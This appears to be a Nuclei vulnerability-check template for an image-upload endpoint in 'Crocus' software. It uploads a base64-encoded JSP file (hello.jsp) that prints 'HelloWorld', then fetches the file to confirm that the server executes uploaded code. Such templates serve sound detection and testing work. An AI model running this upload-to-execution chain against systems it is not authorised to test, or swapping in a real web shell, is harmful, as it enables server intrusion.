id: crocus-imageupload-uploadtorce

info:
  name: Crocus Image Upload to RCE
  author: iSee857
  severity: high
  description: |
    crocus-imageupload-uploadtorce

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/RepairRecord.do?Action=imageupload"
    headers:
      Upgrade-Insecure-Requests: "1"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
      Content-Type: "application/json"
      Accept-Encoding: "gzip, deflate"
      Accept-Language: "zh-CN,zh;q=0.9"
    body: |
      {
        "username": "1",
        "license": "1",
        "chnnel": 1,
        "type": 1,
        "imsage": "PCUgb3V0LnByaW50bG4oIkhlbGxvV29ybGQiKTslPg==",
        "picturename": "hello.jsp"
      }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "true"
        part: body
    extractors:
      - type: regex
        name: uploaded_file_path
        part: body
        regex:
          - "hello\\.jsp"
        internal: true

  - id: check-execution
    method: GET
    path:
      - "{{BaseURL}}/SystemFile/PictureRecord/imageupload/hello.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "HelloWorld"
        part: body